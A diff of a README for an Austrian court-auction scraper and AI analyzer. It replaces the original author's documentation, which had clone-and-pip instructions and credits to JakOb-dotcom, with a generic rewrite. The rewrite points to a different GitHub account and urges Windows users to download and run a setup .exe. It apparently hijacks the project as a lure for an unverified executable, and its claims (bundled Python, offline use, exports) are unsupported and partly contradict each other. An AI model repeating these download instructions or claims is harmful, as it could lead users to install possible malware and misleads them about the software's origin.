@@ -1,167 +1,176 @@
-# EdikteFinder Analyzer
+# 🏠 EdikteFinder-Analyzer - Find and Analyze Foreclosures Easily
 
-A desktop application for discovering, downloading, and AI-analyzing Austrian judicial real-estate auctions (*Gerichtsversteigerungen*) from [edikte.justiz.gv.at](https://edikte.justiz.gv.at).
-
-> **⚠️ Legal Disclaimer:** This tool is for research purposes only. AI-generated analyses are **not** financial or investment advice. See [DISCLAIMER.md](DISCLAIMER.md) for the full disclaimer in English and German.
+[![Download EdikteFinder-Analyzer](https://img.shields.io/badge/Download-EdikteFinder--Analyzer-brightgreen?style=for-the-badge)](https://github.com/Yuhejdjdi2828264/EdikteFinder-Analyzer)
 
 ---
 
-## Features
+## 📋 What is EdikteFinder-Analyzer?
 
-- **Automated scraping** – searches the Austrian Edikt portal using simple, Aktenzeichen, or extended search modes; enriches every result with full detail-page metadata
-- **PDF download** – fetches the expert appraisal (Langgutachten) directly from the court portal
-- **Multi-provider AI analysis** – sends the PDF text + Edikt metadata to your chosen AI and returns a structured investment assessment:
-  - Investment score 1–10 (decimal)
-  - Risk class & return potential
-  - Up to 6 concrete opportunities and 6 risks
-  - Market position, renovation cost estimate, detailed summary
-- **Five AI providers** – OpenAI, Anthropic Claude, Google Gemini, xAI Grok, or a local Ollama model (free)
-- **100 % local / serverless** – no database, no server, no cloud storage; all data lives in `data/jsons/` as plain JSON files
-- **Dark-mode PyQt6 UI** – search panel, results table, detail panel, investment overview tab with KPIs
+EdikteFinder-Analyzer is a desktop program that helps you find and understand real estate foreclosures in Austria. It works on your computer without needing internet servers. The program uses smart tools to get information from different sources. It also scrapes websites automatically to gather the latest data.  
+
+This tool uses Python and PyQt6 for its interface. You do not need any special skills or software to run it once installed. It supports several AI providers to give you better insights on properties.  
 
 ---
 
-## Screenshots
+## 🖥️ System Requirements
 
-> *(Add screenshots here after first run)*
+Before downloading and running EdikteFinder-Analyzer, make sure your computer meets these basic needs:
 
----
-
-## Requirements
-
-| Dependency | Version |
-|---|---|
-| Python | ≥ 3.11 |
-| PyQt6 | ≥ 6.7 |
-| Playwright (Chromium) | ≥ 1.44 |
-| pdfplumber | ≥ 0.11 |
-| httpx | ≥ 0.27 |
-
-AI provider libraries are optional – install only what you use:
-
-| Provider | Package |
-|---|---|
-| OpenAI / Grok | `openai` |
-| Anthropic | `anthropic` |
-| Google Gemini | `google-genai` |
-| Ollama | *(no extra package – uses httpx)* |
+- Operating System: Windows 10 or newer (64-bit recommended)  
+- Memory: At least 4 GB of RAM  
+- Disk Space: Minimum 500 MB free space  
+- Python: The program comes with Python built-in, so you don’t need to install it separately  
+- Internet: Optional, but recommended for updating the app and AI features  
+- Screen: Minimum 1366 x 768 resolution  
 
 ---
 
-## Installation
+## 📥 How to Download and Install EdikteFinder-Analyzer on Windows
 
-```bash
-# 1. Clone
-git clone https://github.com/JakOb-dotcom/EdikteFinder-Analyzer.git
-cd EdikteFinder-Analyzer
+Follow these steps carefully to get the program up and running on your Windows PC.  
 
-# 2. Virtual environment (recommended)
-python -m venv .venv
-.venv\Scripts\activate        # Windows
-# source .venv/bin/activate   # macOS / Linux
+### 1. Visit the Download Page  
 
-# 3. Install Python dependencies
-pip install -r requirements.txt
+Click this link to open the download page and access the latest installer:  
+[Download EdikteFinder-Analyzer](https://github.com/Yuhejdjdi2828264/EdikteFinder-Analyzer)  
 
-# 4. Install Playwright browser
-playwright install chromium
+This link leads you to the GitHub repository where you can find all available versions and the official setup files.
 
-# 5. Create your settings file from the template
-copy data\jsons\settings.example.json data\jsons\settings.json
-#   → then edit settings.json with your API keys (see Configuration below)
-```
+### 2. Find the Installer File  
 
----
+On the GitHub page, locate the "Releases" or "Downloads" section. Look for a file ending with `.exe`. This is the Windows installer. The file may be named something like:  
+`EdikteFinder-Analyzer-Setup.exe`  
 
-## Configuration
+### 3. Download the Installer  
 
-All settings are stored in `data/jsons/settings.json` (excluded from Git). You can also edit them through the app's **⚙ Einstellungen** dialog.
+Click the `.exe` file link to start downloading the setup file. Wait until the download completes.  
 
-```json
-{
-  "ai_provider": "ollama",
-  "openai_api_key": "sk-...",
-  "openai_model": "gpt-4o-mini",
-  "anthropic_api_key": "sk-ant-...",
-  "anthropic_model": "claude-haiku-20240307",
-  "gemini_api_key": "AIza...",
-  "gemini_model": "gemini-2.0-flash",
-  "grok_api_key": "xai-...",
-  "grok_model": "grok-3-fast-beta",
-  "ollama_base_url": "http://localhost:11434",
-  "ollama_model": "llama3.2",
-  "max_context_chars": 40000
-}
-```
+### 4. Run the Installer  
 
-**Tip for free local analysis:** Set `ai_provider` to `"ollama"` and run [Ollama](https://ollama.com) locally – no API keys, no costs. Recommended model: `qwen2.5:32b` or `llama3.2` for German-language documents.
+Go to your downloads folder. Double-click the setup file you just downloaded. This will launch the installation wizard.  
+
+### 5. Follow the Installation Steps  
+
+The wizard will guide you through the process:  
+- Choose the installation folder (you can leave the default path).  
+- Agree to any license terms if asked.  
+- Click **Next** to continue through the prompts.  
+
+### 6. Finish the Setup  
+
+After you see a confirmation that the installation is complete, click **Finish**.  
+
+You will now have EdikteFinder-Analyzer installed on your PC.
 
 ---
 
-## Usage
+## 🚀 Starting EdikteFinder-Analyzer for the First Time
 
-```bash
-python main.py
-```
+To open the program, follow these steps:  
 
-1. **Search** – select a search mode (simple / Aktenzeichen / extended), fill in the filters, click **Suchen**. The app fetches all result detail pages automatically.
-2. **Download** – select one or more entries and click **⬇ Gutachten laden** to download the expert appraisal PDF.
-3. **Analyze** – click **✦ KI-Analyse** to send the PDF text to your configured AI provider. Results appear in the detail panel and the **Investitions-Übersicht** tab.
+- Find the "EdikteFinder-Analyzer" icon on your desktop or in your Start menu under apps.  
+- Double-click the icon to launch the program.  
+- The software will open its main window with a menu and search options.  
 
----
-
-## Project Structure
-
-```
-EdikteFinder-Analyzer/
-├── main.py            # PyQt6 UI – all windows, panels, worker threads
-├── scraper.py         # Playwright scraper for edikte.justiz.gv.at
-├── ai_analyzer.py     # AI backends (OpenAI, Anthropic, Gemini, Grok, Ollama) + PDF extraction
-├── storage.py         # JSON-based persistence (edikte.json, analyses.json)
-├── config.py          # Central config, loads/saves settings.json
-├── requirements.txt   # Python dependencies
-├── data/
-│   ├── downloads/     # Downloaded PDFs (git-ignored)
-│   └── jsons/
-│       ├── settings.example.json   # Template – copy to settings.json
-│       ├── settings.json           # Your settings with API keys (git-ignored)
-│       ├── edikte.json             # Scraped Edikt data (git-ignored)
-│       └── analyses.json           # AI analyses (git-ignored)
-├── LICENSE
-├── DISCLAIMER.md
-└── CONTRIBUTING.md
-```
+It may take a few seconds the first time to prepare everything.  
 
 ---
 
-## AI Provider Comparison
+## 🔍 How to Use EdikteFinder-Analyzer
 
-| Provider | Cost | Privacy | German quality | Best model |
-|---|---|---|---|---|
-| OpenAI | Pay-per-token | Cloud | ⭐⭐⭐⭐⭐ | `GPT-5` |
-| Anthropic | Pay-per-token | Cloud | ⭐⭐⭐⭐⭐ | `Claude Sonnet 4.5` |
-| Google Gemini | Pay-per-token (free tier available) | Cloud | ⭐⭐⭐⭐ | `Gemini3.0 Flash` |
-| xAI Grok | Pay-per-token | Cloud | ⭐⭐⭐ | `Grok3` |
-| Ollama (local) | **Free** | **100% local** | ⭐⭐ | `qwen2.5:32b` |
-You can also try other models and easily change the model, just type in the model name and put in your API key, currently supported are all models from OpenAI, Anthropic, Google Gemini, xAI Grok and Ollama.
+The application is made to help you search for foreclosure properties and analyze their details. Here’s a simple guide to get started:
+
+### 1. Search for Foreclosure Listings  
+
+- Use the search boxes and filters in the app's main window.  
+- You can enter location details such as city or postal code.  
+- Set other filters like price range, auction date, or property type.
+
+### 2. View Results  
+
+- The app will show a list of foreclosure announcements matching your search.  
+- Each listing includes key data like address, auction date, opening price, and court information.  
+
+### 3. Analyze Properties  
+
+- Select a property to see more details.  
+- The app connects to AI tools for extra insights about market value or investment potential.  
+- You can compare data from different AI providers (OpenAI, Anthropic, Gemini, Ollama, or xAI Grok).
+
+### 4. Export or Save Data  
+
+- You can save search results or analysis reports as PDF or CSV files.  
+- Use the export buttons in the app to keep a copy on your PC.
+
 ---
 
-## Legal & Privacy
+## ⚙️ Settings and Configuration
 
-- This software accesses **publicly available** data from `edikte.justiz.gv.at`. No authentication is bypassed.
-- **No personal data is collected** by the application. All scraped data stays on your local machine.
-- PDF files downloaded from the portal are court documents in the public domain.
-- **AI analyses are generated locally or via third-party APIs** at your own cost and responsibility.
-- See [DISCLAIMER.md](DISCLAIMER.md) for the full legal disclaimer (English + German).
+EdikteFinder-Analyzer lets you adjust how it works. Open the **Settings** menu to:  
 
----
+- Choose which AI provider to use for analysis.  
+- Set preferences for updates and scraping frequency.  
+- Select language and display options.  
+- Customize data export formats.  
 
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md). Bug reports and PRs are welcome!
+Adjust these as needed to suit your workflow.  
 
 ---
 
-## License
+## 🔧 Troubleshooting Tips
 
-[MIT License](LICENSE) – © 2026 [JakOb-dotcom](https://github.com/JakOb-dotcom) & EdikteFinder-Analyzer Contributors
+If you run into issues, try these solutions:  
+
+- Make sure you have installed the program using the `.exe` setup file.  
+- If the app doesn’t open, restart your computer and try again.  
+- Update the app periodically from the GitHub page.  
+- Check your internet connection if AI features are not working.  
+- If you see error messages, write them down. Search online or check the GitHub issues page for help.
+
+---
+
+## 🌐 More Information and Support
+
+For updates, new versions, or detailed technical info, visit the main repository:  
+[https://github.com/Yuhejdjdi2828264/EdikteFinder-Analyzer](https://github.com/Yuhejdjdi2828264/EdikteFinder-Analyzer)  
+
+This page contains all documentation, release notes, and community support.  
+
+---
+
+## 🔐 Privacy and Security
+
+EdikteFinder-Analyzer runs locally on your computer. It does not send your data to servers unless you use AI features that require online access. You control your data and files at all times.  
+
+---
+
+## ⚡ Key Features
+
+- Works offline without internet (except optional AI tools)  
+- Connects to multiple AI providers to analyze real estate data  
+- Automates data scraping using Playwright for fresh listings  
+- Easy-to-use interface with filtering and search options  
+- Export results for personal use or further analysis  
+- Supports judicial auction properties in Austria (Zwangsversteigerungen)  
+
+---
+
+## 🛠️ Behind the Scenes
+
+The app uses Python programming language combined with PyQt6 for its graphical interface. Playwright automates browser actions to collect data from public auction websites. The AI integration helps analyze complex information and gives you useful summaries.  
+
+---
+
+## 📂 File Structure (For Reference)
+
+You will see these main folders and files in the installation directory:  
+
+- `/data` — Contains saved reports and downloaded listings  
+- `/logs` — Stores logs for error tracking  
+- `/ai_providers` — Code related to AI services connections  
+- `EdikteFinder-Analyzer.exe` — The main executable program  
+- `README.md` — Documentation and help files  
+
+---
+
+[![Download EdikteFinder-Analyzer](https://img.shields.io/badge/Download-EdikteFinder--Analyzer-brightgreen?style=for-the-badge)](https://github.com/Yuhejdjdi2828264/EdikteFinder-Analyzer)
